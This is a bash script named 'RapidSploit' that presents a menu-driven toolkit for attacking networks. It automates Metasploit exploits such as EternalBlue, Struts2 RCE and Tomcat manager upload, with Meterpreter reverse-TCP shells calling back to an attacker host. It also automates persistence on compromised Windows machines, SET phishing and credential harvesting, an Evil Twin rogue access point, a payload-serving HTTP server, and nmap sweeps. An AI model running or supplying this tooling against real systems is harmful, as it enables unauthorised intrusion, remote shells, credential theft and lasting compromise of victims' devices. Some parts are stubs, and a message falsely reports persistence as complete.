#!/bin/bash

# Function to connect to Wi-Fi network using wlan1
connect_to_wifi() {
    echo "Enter the SSID of the Wi-Fi network:"
    read SSID
    echo "Enter the password for the Wi-Fi network:"
    read -s PASSWORD

    echo "[*] Connecting to Wi-Fi network $SSID on wlan1..."
    nmcli dev wifi connect "$SSID" password "$PASSWORD" ifname wlan1

    if [ $? -eq 0 ]; then
        echo "[*] Successfully connected to $SSID using wlan1."
    else
        echo "[!] Failed to connect to $SSID. Please check the credentials."
        exit 1
    fi
}

# Function to run a network scan using wlan1
scan_network() {
    echo "[*] Starting quick network scan on wlan1..."
    IP=$(ip addr show wlan1 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)
    SUBNET=$(echo $IP | awk -F"." '{print $1"."$2"."$3".0/24"}')

    echo "[*] Scanning the network range: $SUBNET..."
    SCAN_RESULTS=$(sudo nmap -sn -R --dns-server 8.8.8.8 --system-dns -e wlan1 $SUBNET)

    echo "[*] Devices found on the network:"
    echo "$SCAN_RESULTS"
}

# Function for post-exploitation automation (Metasploit and persistence)
post_exploitation() {
    echo "[*] Automating post-exploitation tasks..."
    msfconsole -x "
        use exploit/windows/smb/ms17_010_eternalblue;
        set RHOST 192.168.1.105;
        set LHOST 192.168.1.100;
        set LPORT 4444;
        run;
        exit;
    "
    echo "[*] Persistence setup complete."
}

# Function to map network and discover vulnerabilities
network_mapping() {
    echo "[*] Running automated network mapping and vulnerability discovery with Nmap and Metasploit..."
    nmap -sS -O -v 192.168.1.0/24 -oN network_map.txt
    echo "[*] Network mapping and discovery saved to network_map.txt."
}

# Function for phishing and credential harvesting using SET
start_credential_harvest() {
    echo "[*] Starting credential harvesting with SET..."
    sudo setoolkit
}

# Function for payload delivery via HTTP/SMB
payload_delivery() {
    echo "[*] Delivering payload via HTTP..."
    python3 -m http.server 8080 &
    echo "[*] Payload server running on http://$LHOST:8080. Press Ctrl+C to stop."
    read -p "Press Enter to continue..."
    kill $!
}

# Function for Wi-Fi phishing and Evil Twin Attack
wifi_phishing() {
    echo "[*] Starting Evil Twin Wi-Fi phishing attack on wlan1..."
    airbase-ng -e "Free_WiFi" -c 6 wlan1
}

# Function for Bluetooth exploits and scanning
bluetooth_scan() {
    echo "[*] Scanning for Bluetooth devices..."
    sudo bt-device -l
    echo "[*] Attempting Bluetooth exploits..."
}

# Function for persistence setup on compromised devices
setup_persistence() {
    echo "[*] Setting up persistence on the compromised device..."
    msfconsole -x "
        use exploit/windows/local/persistence;
        set SESSION 1;
        run;
        exit;
    "
}

# Function to perform automated exploit database search
exploit_db_search() {
    echo "Enter the vulnerability or keyword to search for in Exploit-DB:"
    read keyword
    searchsploit "$keyword"
}

# Function to run Metasploit Exploit
run_metasploit() {
    echo "[*] Starting Metasploit and running exploits..."
    echo "Enter the IP of the device to exploit (RHOST):"
    read RHOST

    echo "Choose an exploit to run:"
    echo "1) MS17-010 (EternalBlue) - SMB Exploit"
    echo "2) Apache Struts 2 Remote Code Execution"
    echo "3) Tomcat Application Manager Upload"
    echo "4) Android Exploit (Meterpreter Reverse TCP Handler)"
    echo "5) Basic Reverse TCP (Windows)"
    echo "6) Custom Exploit (Enter your own)"
    read -p "Enter choice: " exploit_choice

    case $exploit_choice in
        1)
            EXPLOIT="exploit/windows/smb/ms17_010_eternalblue"
            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
            ;;
        2)
            EXPLOIT="exploit/multi/http/struts2_content_type_ognl"
            PAYLOAD="java/meterpreter/reverse_tcp"
            ;;
        3)
            EXPLOIT="exploit/multi/http/tomcat_mgr_upload"
            PAYLOAD="java/meterpreter/reverse_tcp"
            ;;
        4)
            EXPLOIT="exploit/multi/handler"
            PAYLOAD="android/meterpreter/reverse_tcp"
            ;;
        5)
            EXPLOIT="exploit/windows/meterpreter/reverse_tcp"
            PAYLOAD="windows/meterpreter/reverse_tcp"
            ;;
        6)
            echo "Enter your custom exploit path (e.g., exploit/windows/http/some_exploit):"
            read EXPLOIT
            echo "Enter your payload (e.g., windows/meterpreter/reverse_tcp):"
            read PAYLOAD
            ;;
        *)
            echo "Invalid option, exiting..."
            return
            ;;
    esac

    echo "Enter your local IP address (LHOST):"
    read LHOST
    echo "Enter the local port (LPORT) for reverse connection (default 4444):"
    read LPORT
    LPORT=${LPORT:-4444}

    msfconsole -x "
        use $EXPLOIT;
        set RHOST $RHOST;
        set PAYLOAD $PAYLOAD;
        set LHOST $LHOST;
        set LPORT $LPORT;
        exploit;
    "
}

# Function to display main menu
main_menu() {
    while true; do
        echo "Choose an action:"
        echo "1) Connect to Wi-Fi"
        echo "2) Scan Network"
        echo "3) Post-Exploitation Automation"
        echo "4) Automated Network Mapping and Vulnerability Discovery"
        echo "5) Start Phishing and Credential Harvesting (SET)"
        echo "6) Payload Delivery (HTTP/SMB)"
        echo "7) Wi-Fi Phishing (Evil Twin Attack)"
        echo "8) Bluetooth Exploits and Scanning"
        echo "9) Persistence Setup on Compromised Devices"
        echo "10) Automated Exploit Database Search"
        echo "11) Run Metasploit Exploit"
        echo "12) Exit"
        read -p "Enter choice: " choice

        case $choice in
            1) connect_to_wifi ;;
            2) scan_network ;;
            3) post_exploitation ;;
            4) network_mapping ;;
            5) start_credential_harvest ;;
            6) payload_delivery ;;
            7) wifi_phishing ;;
            8) bluetooth_scan ;;
            9) setup_persistence ;;
            10) exploit_db_search ;;
            11) run_metasploit ;;
            12) exit 0 ;;
            *) echo "Invalid option." ;;
        esac
    done
}

# Main script
echo "[*] Welcome to RapidSploit - Automated Exploitation and Vulnerability Scanning Tool"
main_menu
